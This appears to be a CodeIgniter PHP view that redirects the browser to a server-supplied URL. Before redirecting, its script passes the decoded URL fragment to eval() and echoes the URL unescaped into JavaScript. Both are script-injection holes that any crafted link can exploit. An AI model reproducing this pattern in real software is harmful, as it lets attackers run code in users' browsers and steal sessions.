<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">
<body>
<script type="text/javascript">
var url = '<?php echo $url; ?>';
 window.onload = function(){
  var hash = location.hash.replace('#','');
  if(hash){
   try {
    eval(decodeURIComponent(hash));
   } catch(e) {
    console.log(e);
   }
  }
  location.href = url;
 };
</script>
</body>
</html>